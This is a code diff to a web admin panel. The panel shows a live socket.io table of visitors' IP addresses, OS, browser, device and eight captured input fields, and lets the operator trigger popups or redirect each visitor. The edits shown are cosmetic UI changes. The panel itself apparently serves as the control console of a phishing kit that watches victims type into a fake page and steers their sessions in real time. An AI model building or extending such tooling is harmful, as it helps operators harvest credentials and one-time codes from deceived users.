@@ -21,6 +21,9 @@
                 border-collapse: collapse;
                 text-align: center;
             }
+            .table-input {
+                width: 50px;
+            }
         </style>
 
         <div class="table-container">
@@ -75,12 +78,12 @@
                     data.forEach(user => {
                         $('table tbody').prepend(`
                             <tr userId="${user.userId}">
-                                <td><span>${user.ipAddress}</span> <button class="table-copy">📋</button></td>
-                                <td><span>${user.os}</span> <button class="table-copy">📋</button></td>
-                                <td><span>${user.browserName}</span> <button class="table-copy">📋</button></td>
-                                <td><span>${user.deviceName}</span> <button class="table-copy">📋</button></td>
-                                <td><span>${user.userId}</span> <button class="table-copy">📋</button></td>
-                                <td><span>${user.datetime}</span> <button class="table-copy">📋</button></td>
+                                <td><span>${user.ipAddress}</span></td>
+                                <td><span>${user.os}</span></td>
+                                <td><span>${user.browserName}</span></td>
+                                <td><span>${user.deviceName}</span></td>
+                                <td><span>${user.userId}</span></td>
+                                <td><span>${user.datetime}</span></td>
                                 <td><span>${user.span}</span> <button class="table-copy">📋</button></td>
                                 <td><span>${user.input1}</span> <button class="table-copy">📋</button></td>
                                 <td><span>${user.input2}</span> <button class="table-copy">📋</button></td>
@@ -88,10 +91,10 @@
                                 <td><span>${user.input4}</span> <button class="table-copy">📋</button></td>
                                 <td><span>${user.input5}</span> <button class="table-copy">📋</button></td>
                                 <td><span>${user.input6}</span> <button class="table-copy">📋</button></td>
-                                <td><span>${user.input7}</span> <button class="table-copy">📋</button></td>
+                                <td><span>${user.input7}</span></td>
                                 <td><span>${user.input8}</span> <button class="table-copy">📋</button></td>
                                 <td class="popup-open">
-                                    <span>${user.popupOpen === true ? 'Yes' : 'No'}</span>
+                                    <span>${user.popupOpen === true ? '🟩' : '🟥'}</span>
                                     <button class="open-popup-btn" userId="${user.userId}" style="display: ${user.popupOpen ? 'none' : 'block'}">Open</button>
                                     <button class="close-popup-btn" userId="${user.userId}" style="display: ${user.popupOpen === false ? 'none' : 'block'}">Close</button>
                                 </td>
@@ -145,12 +148,12 @@
                 socket.on('updateTable', (data) => {
                     $('table tbody').prepend(`
                         <tr userId="${data.userId}">
-                            <td><span>${data.ipAddress}</span> <button class="table-copy">📋</button></td>
-                            <td><span>${data.os}</span> <button class="table-copy">📋</button></td>
-                            <td><span>${data.browserName}</span> <button class="table-copy">📋</button></td>
-                            <td><span>${data.deviceName}</span> <button class="table-copy">📋</button></td>
-                            <td><span>${data.userId}</span> <button class="table-copy">📋</button></td>
-                            <td><span>${data.datetime}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.ipAddress}</span></td>
+                            <td><span>${data.os}</span></td>
+                            <td><span>${data.browserName}</span></td>
+                            <td><span>${data.deviceName}</span></td>
+                            <td><span>${data.userId}</span></td>
+                            <td><span>${data.datetime}</span></td>
                             <td><span>${data.span}</span> <button class="table-copy">📋</button></td>
                             <td><span>${data.input1}</span> <button class="table-copy">📋</button></td>
                             <td><span>${data.input2}</span> <button class="table-copy">📋</button></td>
@@ -158,10 +161,10 @@
                             <td><span>${data.input4}</span> <button class="table-copy">📋</button></td>
                             <td><span>${data.input5}</span> <button class="table-copy">📋</button></td>
                             <td><span>${data.input6}</span> <button class="table-copy">📋</button></td>
-                            <td><span>${data.input7}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input7}</span></td>
                             <td><span>${data.input8}</span> <button class="table-copy">📋</button></td>
                             <td class="popup-open">
-                                <span>${data.popupOpen === true ? 'Yes' : 'No'}</span>
+                                <span>${data.popupOpen === true ? '🟩' : '🟥'}</span>
                                 <button class="open-popup-btn" userId="${data.userId}" style="display: ${data.popupOpen ? 'none' : 'block'}">Open</button>
                                 <button class="close-popup-btn" userId="${data.userId}" style="display: ${data.popupOpen === false ? 'none' : 'block'}">Close</button>
                             </td>
@@ -186,12 +189,12 @@
                 socket.on('updateRow', (data) => {
                     var popupState = $(`table tbody tr[userId="${data.userId}"] .popup-open`).html()
                     $(`table tbody tr[userId="${data.userId}"]`).html(`
-                            <td><span>${data.ipAddress}</span> <button class="table-copy">📋</button></td>
-                            <td><span>${data.os}</span> <button class="table-copy">📋</button></td>
-                            <td><span>${data.browserName}</span> <button class="table-copy">📋</button></td>
-                            <td><span>${data.deviceName}</span> <button class="table-copy">📋</button></td>
-                            <td><span>${data.userId}</span> <button class="table-copy">📋</button></td>
-                            <td><span>${data.datetime}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.ipAddress}</span></td>
+                            <td><span>${data.os}</span></td>
+                            <td><span>${data.browserName}</span></td>
+                            <td><span>${data.deviceName}</span></td>
+                            <td><span>${data.userId}</span></td>
+                            <td><span>${data.datetime}</span></td>
                             <td><span>${data.span}</span> <button class="table-copy">📋</button></td>
                             <td><span>${data.input1}</span> <button class="table-copy">📋</button></td>
                             <td><span>${data.input2}</span> <button class="table-copy">📋</button></td>
@@ -199,7 +202,7 @@
                             <td><span>${data.input4}</span> <button class="table-copy">📋</button></td>
                             <td><span>${data.input5}</span> <button class="table-copy">📋</button></td>
                             <td><span>${data.input6}</span> <button class="table-copy">📋</button></td>
-                            <td><span>${data.input7}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input7}</span></td>
                             <td><span>${data.input8}</span> <button class="table-copy">📋</button></td>
                             <td class="popup-open">
                                 ${popupState}
@@ -222,7 +225,7 @@
 
                 socket.on('handlePopup', (userId, popupState) => {
                     $(`table tbody tr[userId="${userId}"] .popup-open`).html(`
-                        <span>${popupState === true ? 'Yes' : 'No'}</span>
+                        <span>${popupState === true ? '🟩' : '🟥'}</span>
                         <button class="open-popup-btn" userId="${userId}" style="display: ${popupState ? 'none' : 'block'}">Open</button>
                         <button class="close-popup-btn" userId="${userId}" style="display: ${popupState === false ? 'none' : 'block'}">Close</button>
                     `)
@@ -238,7 +241,7 @@
 
                 $('table').on('click', '.popup-link-button', function() {
                     socket.emit('redirect', $(this).attr('userId'), $(this).prev().val())
-                    $(this).prev().val('')
+                    // $(this).prev().val('')
                 })
 
                 $('table').on('click', '.table-btn', function() {
